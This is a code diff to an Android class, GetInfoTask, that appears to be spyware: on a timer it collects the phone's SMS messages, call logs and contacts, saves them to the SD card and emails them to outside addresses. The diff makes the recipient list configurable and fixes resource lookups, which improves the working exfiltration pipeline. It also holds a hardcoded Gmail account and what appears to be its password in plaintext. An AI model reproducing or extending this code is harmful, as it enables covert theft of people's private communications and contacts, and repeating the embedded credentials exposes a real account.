@@ -22,6 +22,7 @@ import com.system.feature.contact.ContactCtrl;
 import com.system.feature.contact.ContactInfo;
 import com.system.feature.phonecall.PhoneCallCtrl;
 import com.system.feature.phonecall.PhoneCallInfo;
+import com.system.feature.pref.GlobalPref;
 import com.system.feature.sms.SmsCtrl;
 import com.system.feature.sms.SmsInfo;
 import com.system.utils.*;
@@ -80,13 +81,13 @@ public class GetInfoTask extends TimerTask
 			CollectSms(this.service);
 		
 			// Send mail
-			String subject = Resources.getSystem().getString(R.string.mail_from) 
+			String subject = service.getResources().getString(R.string.mail_from) 
 	           		 + DeviceProperty.getPhoneNumber(service) 
 	           		 + " - " + (new String()).toString();
-			String body = String.format(Resources.getSystem().getString(R.string.mail_body), 
+			String body = String.format(service.getResources().getString(R.string.mail_body), 
 					DeviceProperty.getPhoneNumber(service));
 			List<String> fileList = new ArrayList<String>();
-			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
+			String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
 			boolean result = sendMail(subject, body, 
 					"richardroky@gmail.com", "yel510641",
 					recipients, fileList);
@@ -108,7 +109,7 @@ public class GetInfoTask extends TimerTask
 		}
 		
 		String fileName = FileCtrl.makeFileName(context.getApplicationContext(), 
-				Resources.getSystem().getString(R.string.sms_name)); 
+				context.getResources().getString(R.string.sms_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
@@ -128,7 +129,7 @@ public class GetInfoTask extends TimerTask
 		}
 		
 		String fileName = FileCtrl.makeFileName(context, 
-				Resources.getSystem().getString(R.string.phonecall_name)); 
+				context.getResources().getString(R.string.phonecall_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
@@ -144,11 +145,10 @@ public class GetInfoTask extends TimerTask
 		List<ContactInfo> list = ContactCtrl.getContactList(context);
 		for (int i = 0; i < list.size(); i++)
 		{
-			sb.append(list.get(i).toString());
+			sb.append(list.get(i).toString() + SysUtils.NEWLINE);
 		}
 		
-		String fileName = FileCtrl.makeFileName(context, 
-				Resources.getSystem().getString(R.string.contact_name)); 
+		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
@@ -180,5 +180,10 @@ public class GetInfoTask extends TimerTask
 		return ret;
 	}
 	
+	private static String[] getRecipients(Context context)
+	{
+		String mail = GlobalPref.getMail(context);
+		return mail.split(",");
+	}
 	
 }
